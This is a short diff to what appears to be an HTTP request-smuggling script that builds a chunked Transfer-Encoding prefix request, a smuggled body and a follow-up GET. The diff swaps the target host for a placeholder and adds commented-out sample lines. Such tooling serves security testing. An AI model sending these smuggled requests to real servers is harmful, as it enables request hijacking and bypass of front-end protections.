@@ -7,7 +7,7 @@ SmuggleGadget         = "Transfer-Encoding: chunked"
 TheVerb               = "POST"
 TheEP                 = "/"
 TheProtocol           = "HTTP/1.1"
-TheHost               = "https://private.com"
+TheHost               = "<example>.com"
 # --
 
 # -- Prefix Request Parameters
@@ -55,6 +55,7 @@ prefix_full += RN
 # -- smuggle request body starts here --
 smuggle_body = "3" + RN
 smuggle_body += "x=y" + RN
+#smuggle_body += "search=kleiton0x7e&id=1" + RN
 smuggle_body += "0"
 smuggle_body += RN
 smuggle_body += RN
@@ -71,6 +72,7 @@ smuggle += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/53
 smuggle += "Origin: https://www.google.com" + RN 
 smuggle += "Accept-Encoding: gzip, deflate" + RN
 smuggle += "Content-Type: application/x-www-form-urlencoded" + RN
+#smuggle += "My Header: my value" + RN
 smuggle += RN
 #merge the headers with the body request
 smuggle += smuggle_body
@@ -84,6 +86,7 @@ regular  = "GET / HTTP/1.1" + RN
 regular += ("Host: %s" % (TheHost)) + RN
 regular += "Origin: https://www.google.com" + RN
 regular += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" + RN
+#regular += "My header: my value" + RN
 regular += RN
 
 
